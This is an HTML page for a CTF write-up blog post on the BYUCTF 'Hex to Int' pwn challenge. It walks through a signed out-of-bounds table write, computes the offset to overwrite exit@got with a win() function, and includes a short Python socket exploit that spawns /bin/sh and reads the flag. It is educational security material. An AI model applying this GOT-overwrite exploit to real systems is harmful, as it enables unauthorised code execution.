@@ -1,0 +1,131 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#080706">
+  <meta name="description" content="A &#x27;hex converter&#x27; with a signed table index and idx*4 addressing turns &#x27;expand the table&#x27; into an arbitrary 4-byte write. Partial RELRO means a writable GOT, so point exit@got at win() and trigger it from the menu. Classic ret2win, no leak.">
+  <meta property="og:type" content="article">
+  <meta property="og:site_name" content="0xAdham Field Notes">
+  <meta property="og:title" content="BYUCTF: Hex to Int · 0xAdham">
+  <meta property="og:description" content="A &#x27;hex converter&#x27; with a signed table index and idx*4 addressing turns &#x27;expand the table&#x27; into an arbitrary 4-byte write. Partial RELRO means a writable GOT, so point exit@got at win() and trigger it from the menu. Classic ret2win, no leak.">
+  <meta name="twitter:card" content="summary_large_image">
+  <title>BYUCTF: Hex to Int · 0xAdham</title>
+  <link rel="icon" type="image/svg+xml" href="/assets/mark.svg">
+  <link rel="stylesheet" href="/assets/site.css">
+</head>
+<body>
+  <header class="site-header">
+    <div class="wrap header-inner">
+      <a class="brand" href="/" aria-label="0xAdham Field Notes home">
+        <svg class="brand-mark" viewBox="0 0 40 40" aria-hidden="true"><path d="M10 4H4v32h6M30 4h6v32h-6" fill="none" stroke="currentColor" stroke-width="3"/><rect x="12" y="17" width="7" height="7" fill="currentColor"/><rect x="22" y="17" width="7" height="7" fill="#ff3428"/></svg>
+        <span class="brand-name">0xADHAM</span><span class="brand-note">Field notes / security research</span>
+      </a>
+      <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="primary-nav">[ Menu ]</button>
+      <nav class="nav-links" id="primary-nav" aria-label="Main navigation">
+        <a href="/">Home</a><a href="/writing/" aria-current="page">Writing</a><a href="/research/">Research</a><a href="/about/">About</a>
+      </nav>
+    </div>
+  </header>
+  <main>
+    <div class="wrap article-header">
+      <div class="eyebrow"><span class="index">FIELD NOTE</span> CTF</div>
+      <h1 class="page-title">BYUCTF: Hex to Int</h1>
+      <div class="article-byline">
+        <span>By Adham Mohammed / 0xAdham</span>
+        <span>2026-05-31</span>
+        <span>CTF</span>
+      </div>
+    </div>
+    <section class="section">
+      <div class="wrap content-layout">
+        <article class="prose">
+          <p><strong>Platform:</strong> BYUCTF<br />
+<strong>Challenge:</strong> Hex to Int<br />
+<strong>Category:</strong> Pwn<br />
+<strong>Difficulty:</strong> Easy/Medium</p>
+<h2>Flag</h2>
+<p><code>byuctf{0v3rwr1t1ng_t00??_3e2d88}</code></p>
+<h2>Target</h2>
+<p><code>&lt;remote-host&gt;:1365</code>. File <code>hex_to_int2</code>.</p>
+<ul>
+<li>ELF 64-bit, <strong>non-PIE</strong> (<code>EXEC</code>), NX on, <strong>Partial RELRO</strong> (no <code>BIND_NOW</code> → GOT writable), not stripped.</li>
+<li>Flavor text: <em>"I vibe coded a hex converter… ran out of tokens after 0xff, so you can just add the correct conversions as you find them"</em> → you can <strong>write past the table</strong>.</li>
+<li>Imports include <code>system</code> + a <code>/bin/sh</code> string, and there's a <code>win()</code> function.</li>
+</ul>
+<h2>Recon</h2>
+<p><code>win()</code> @ <code>0x4011d4</code>:</p>
+<pre><code class="language-asm">mov edi, 0x402075        ; &quot;/bin/sh&quot;
+call system
+</code></pre>
+<p>So <code>win</code> sets up its <strong>own</strong> argument. Hijacking control to it from anywhere yields a shell.</p>
+<p><code>main</code> is a menu loop over a table at <strong><code>0x404060</code></strong> (4-byte int entries):</p>
+<pre><code class="language-c">int idx, val;
+scanf(&quot;%d&quot;, &amp;choice);
+// choice == 1: convert
+    scanf(&quot;%x&quot;, &amp;idx);                 // index parsed as HEX
+    printf(&quot;...%d\n&quot;, table[idx]);     // OOB READ
+// choice == 2: expand
+    scanf(&quot;%x&quot;, &amp;idx);                 // index parsed as HEX
+    scanf(&quot;%d&quot;, &amp;val);                 // value parsed as DECIMAL
+    table[idx] = val;                  // *** OOB WRITE ***
+// else: exit(0)
+</code></pre>
+<p>Disassembly of the write: <code>mov [rax*4 + 0x404060], edx</code> with <code>rax = (int)idx</code> sign-extended (<code>cdqe</code>). So option 2 is an <strong>arbitrary 4-byte write</strong>: <code>*(0x404060 + idx*4) = val</code>, with a <em>signed</em> index → negative indices reach lower addresses.</p>
+<h2>GOT overwrite → ret2win</h2>
+<p>Partial RELRO ⇒ <code>.got.plt</code> is writable. Overwrite a GOT entry with <code>win</code> and let the program call that function.</p>
+<p>GOT entries (<code>readelf -r</code>): <code>puts 0x404000</code>, <code>system 0x404010</code>, <code>printf 0x404018</code>, <code>scanf 0x404020</code>, <strong><code>exit 0x404028</code></strong>.</p>
+<p>Target <code>exit@got</code> (clean: I control exactly when it fires by choosing menu option 3):</p>
+<pre><code>idx*4 = 0x404028 - 0x404060 = -0x38   -&gt;  idx = -14
+</code></pre>
+<ul>
+<li><strong>Index</strong> is read with <code>%x</code>, so <code>-14</code> is entered as <code>fffffff2</code> (→ <code>(int)0xfffffff2 = -14</code>, <code>cdqe</code> → <code>rax = -14</code>, <code>rax*4 = -56</code>, <code>0x404060 - 56 = 0x404028</code>). ✅ (GOT is 8-aligned, table is 8-aligned → even index, lands exactly on the entry.)</li>
+<li><strong>Value</strong> = <code>win = 0x4011d4 = 4198868</code> (decimal, for <code>%d</code>). Only the low 4 bytes are written; the entry's high 4 bytes were already <code>0</code> (addresses &lt; 4 GiB), so <code>exit@got</code> becomes <code>0x00000000004011d4</code>.</li>
+</ul>
+<p>Then choose menu option <strong>3</strong> → <code>exit()</code> dereferences the GOT → <code>win()</code> → <code>system("/bin/sh")</code>.</p>
+<pre><code class="language-python">import socket, time, re
+s = socket.create_connection(('&lt;remote-host&gt;', 1365))
+def snd(b): s.sendall(b); time.sleep(0.2)
+snd(b'2\n')            # expand table (the arbitrary write)
+snd(b'fffffff2\n')     # index -14 (hex) -&gt; exit@got @ 0x404028
+snd(b'4198868\n')      # value = win (0x4011d4)
+snd(b'3\n')            # menu option 3 -&gt; exit() -&gt; win -&gt; /bin/sh
+snd(b'cat flag.txt\n')
+time.sleep(1); print(s.recv(4096).decode())
+# -&gt; byuctf{0v3rwr1t1ng_t00??_3e2d88}   (flag at /app/flag.txt)
+</code></pre>
+<h2>Takeaways</h2>
+<ul>
+<li><strong>Watch the index type.</strong> A <em>signed</em> table index + <code>idx*4</code> addressing turns "expand the table" into an arbitrary write at <code>base + idx*4</code>, including negative offsets into the GOT/data below the array.</li>
+<li><strong>Partial RELRO = writable GOT.</strong> Classic ret2win: point any soon-to-be-called GOT slot (<code>exit</code> is tidiest) at a <code>win</code> gadget. Non-PIE means the <code>win</code> address is a fixed constant. No leak needed.</li>
+<li><strong><code>win</code> that loads its own arg</strong> is the easiest target: you don't need to control registers, any redirected call lands a shell.</li>
+<li>Mind the radix of each <code>scanf</code>: here index = <code>%x</code>, value = <code>%d</code>. Mixing them up sends the wrong offset/value.</li>
+<li>Only the low 4 bytes get written, which is fine because the target address (<code>0x4011d4</code>) fits in 32 bits and the upper GOT bytes are already zero.</li>
+</ul>
+<p><em>0xAdham</em></p>
+        </article>
+        <aside class="article-aside">
+          <div class="eyebrow"><span class="index">FIELD NOTE</span> Details</div>
+          <h2>Clear. Scoped. Reproducible.</h2>
+          <p>A &#x27;hex converter&#x27; with a signed table index and idx*4 addressing turns &#x27;expand the table&#x27; into an arbitrary 4-byte write. Partial RELRO means a writable GOT, so point exit@got at win() and trigger it from the menu. Classic ret2win, no leak.</p>
+          <div style="margin: 20px 0; padding-top: 16px; border-top: 1px solid var(--line); font-size: 13px; font-family: var(--mono); color: var(--muted); line-height: 1.8;">
+            <div><strong style="color:var(--ink)">Published:</strong> 2026-05-31</div>
+            <div><strong style="color:var(--ink)">Category:</strong> CTF</div>
+            <div style="margin-top:10px"><strong style="color:var(--ink)">Tags:</strong><div style="margin-top:5px"><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">ctf</span><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">pwn</span><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">oob-write</span><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">got-overwrite</span><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">partial-relro</span><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">ret2win</span><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">byuctf</span></div></div>
+          </div>
+          <a class="button" href="/writing/">Back to archive <span class="arrow" aria-hidden="true">←</span></a>
+        </aside>
+      </div>
+    </section>
+  </main>
+  <footer class="site-footer">
+    <div class="wrap">
+      <div class="footer-bottom">
+        <span>© 2026 · 0xAdham</span>
+        <a href="/writing/">Return to writing ↑</a>
+      </div>
+    </div>
+  </footer>
+  <script src="/assets/site.js" defer></script>
+</body>
+</html>
